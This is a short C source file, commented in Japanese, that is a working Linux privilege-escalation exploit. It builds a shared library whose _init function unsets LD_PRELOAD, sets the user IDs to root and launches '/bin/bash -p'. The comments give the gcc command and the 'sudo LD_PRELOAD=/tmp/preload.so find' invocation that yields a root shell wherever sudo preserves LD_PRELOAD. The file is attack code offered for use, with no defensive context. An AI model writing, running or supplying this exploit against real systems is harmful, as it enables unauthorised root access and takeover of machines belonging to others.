/*
 * 1. コンパイル
 * gcc -fPIC -shared -nostartfiles -o /tmp/preload.so ./preload.c
 *
 * 2. LD_PRELOADを指定して、sudoコマンド実行
 * sudo LD_PRELOAD=/tmp/preload.so find
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

#include <unistd.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
